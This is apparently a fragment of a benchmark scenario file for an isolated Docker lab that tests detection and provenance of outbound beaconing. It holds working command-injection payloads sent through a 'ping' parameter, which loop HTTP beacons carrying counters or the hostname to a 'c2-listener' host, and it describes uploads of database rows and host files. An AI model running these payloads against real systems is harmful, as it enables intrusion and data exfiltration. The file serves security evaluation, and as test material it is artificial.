command_variants.description: Seed one order, query recent orders from SQLite, and POST the JSON body to c2-listener /upload.

scenarios.description: Low-frequency periodic outbound beacon with lightweight exfiltration attempts.

command_variants.description: Emit six low-frequency HTTP GET beacons with counter identifiers.
command_variants.command: curl -sG 'http://vuln-app:5000/ping' --data-urlencode "ip=127.0.0.1;for i in $(seq 1 6); do I=$i python -c 'import os,urllib.request; urllib.request.urlopen("http://c2-listener:4444/beacon?id=counter_" + os.environ.get("I", "0"), timeout=3).read()' 2>/dev/null || true; sleep 10; done" >/dev/null

safety.scope: local isolated Docker Compose lab only
safety.notes: Commands are synthetic benchmark stimuli for EBLIT/DRSEC provenance evaluation and are not intended for production systems.

command_variants.description: Emit five HTTP GET beacons carrying a URL-encoded hostname token.
command_variants.command: curl -sG 'http://vuln-app:5000/ping' --data-urlencode "ip=127.0.0.1;for i in $(seq 1 5); do python -c 'import os,urllib.parse,urllib.request; bid=urllib.parse.quote("host_"+os.uname().nodename); urllib.request.urlopen("http://c2-listener:4444/beacon?id="+bid, timeout=3).read()' 2>/dev/null || true; sleep 12; done" >/dev/null

command_variants.description: Periodically POST the container hostname file to c2-listener /upload.
